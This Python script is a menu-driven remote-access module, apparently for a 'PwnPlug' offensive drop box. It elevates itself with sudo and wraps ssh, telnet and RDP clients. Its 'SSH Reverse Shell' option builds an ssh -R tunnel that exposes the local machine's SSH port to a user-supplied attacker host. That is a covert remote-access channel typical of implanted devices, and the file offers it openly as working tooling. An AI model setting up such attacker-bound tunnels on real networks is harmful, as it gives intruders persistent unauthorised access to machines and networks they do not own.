#!/usr/bin/env python3
"""
PwnPlug Lite - Remote Access Menu Module
Corrected Version - Fully Root-Locked & Interactive Command Execution
"""

import os
import sys
import subprocess
import shutil
from typing import List


# ---------------------------------------------------------------------------
# AUTO-SUDO / ROOT ELEVATION
# ---------------------------------------------------------------------------

def ensure_root():
    """Re-run this script with sudo if we are not root."""
    if os.geteuid() != 0:
        print("[!] Root privileges required.")
        print("[*] Re-running module with sudo...\n")
        try:
            os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
        except Exception as e:
            print(f"[!] Unable to escalate privileges: {e}")
            sys.exit(1)


# ---------------------------------------------------------------------------
# HELPERS
# ---------------------------------------------------------------------------

def clear_screen():
    os.system("clear")


def press_enter_to_continue():
    input("\n[*] Press ENTER to continue...")


def command_exists(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def run_interactive(cmd: List[str]):
    """
    Launches the command as a fully interactive foreground process.
    Ensures SSH, Telnet, RDP behave *naturally*.
    """
    try:
        print(f"\n[>] Executing: {' '.join(cmd)}\n")
        # This keeps the terminal session OPEN until user exits program
        subprocess.call(cmd)
    except KeyboardInterrupt:
        print("\n[!] Session interrupted.")
    press_enter_to_continue()


# ---------------------------------------------------------------------------
# MENU OPTIONS
# ---------------------------------------------------------------------------

def option_1_ssh_connect():
    clear_screen()
    print("=== SSH CONNECT ===\n")

    target = input("Target IP / Hostname: ").strip()
    user = input("Username (blank = current user): ").strip()
    port = input("Port [22]: ").strip() or "22"

    if not target:
        print("[!] Target required.")
        press_enter_to_continue()
        return

    dest = f"{user}@{target}" if user else target
    cmd = ["ssh", "-p", port, dest]

    run_interactive(cmd)


def option_2_ssh_reverse_shell():
    clear_screen()
    print("=== SSH REVERSE TUNNEL ===\n")
    print("This creates a reverse tunnel from THIS machine → Attacker.\n")

    attacker_ip = input("Attacker IP: ").strip()
    attacker_user = input("Attacker Username: ").strip()
    attacker_port = input("Attacker SSH Port [22]: ").strip() or "22"
    remote_port = input("Remote Port to expose (e.g., 4444): ").strip()

    if not (attacker_ip and attacker_user and remote_port):
        print("[!] Missing required fields.")
        press_enter_to_continue()
        return

    cmd = [
        "ssh",
        "-R", f"{remote_port}:localhost:22",
        f"{attacker_user}@{attacker_ip}",
        "-p", attacker_port
    ]

    run_interactive(cmd)


def option_3_telnet():
    clear_screen()
    print("=== TELNET SESSION ===\n")

    if not command_exists("telnet"):
        print("[!] Missing binary: telnet")
        print("Install using:  apt install telnet")
        press_enter_to_continue()
        return

    host = input("Target Host: ").strip()
    port = input("Port [23]: ").strip() or "23"

    cmd = ["telnet", host, port]
    run_interactive(cmd)


def option_4_rdp():
    clear_screen()
    print("=== RDP (xfreerdp) ===\n")

    if not command_exists("xfreerdp"):
        print("[!] xfreerdp not installed.")
        print("Install using: apt install freerdp2-x11")
        press_enter_to_continue()
        return

    target = input("Target IP/Hostname: ").strip()
    user = input("Username: ").strip()
    domain = input("Domain (optional): ").strip()
    width = input("Width [1280]: ").strip() or "1280"
    height = input("Height [720]: ").strip() or "720"

    if not (target and user):
        print("[!] Missing required fields.")
        press_enter_to_continue()
        return

    cmd = ["xfreerdp", f"/v:{target}", f"/u:{user}", f"/size:{width}x{height}"]

    if domain:
        cmd.append(f"/d:{domain}")

    run_interactive(cmd)


def option_5_quit():
    clear_screen()
    print("[*] Closing Remote Access Module.\n")
    sys.exit(0)


# ---------------------------------------------------------------------------
# MAIN MENU
# ---------------------------------------------------------------------------

def print_banner():
    print(r"""
=========================================
      PwnPlug Lite - Remote Access
=========================================
""")


def print_menu():
    print("Select an option:\n")
    print("  [1] SSH Connect")
    print("  [2] SSH Reverse Shell")
    print("  [3] Telnet (system client)")
    print("  [4] RDP (xfreerdp)")
    print("  [5] Quit\n")


def main():
    ensure_root()

    while True:
        clear_screen()
        print_banner()
        print_menu()

        choice = input("PwnPlug-Remote> ").strip()

        if choice == "1": option_1_ssh_connect()
        elif choice == "2": option_2_ssh_reverse_shell()
        elif choice == "3": option_3_telnet()
        elif choice == "4": option_4_rdp()
        elif choice == "5": option_5_quit()
        else:
            print("[!] Invalid choice.")
            press_enter_to_continue()


if __name__ == "__main__":
    main()
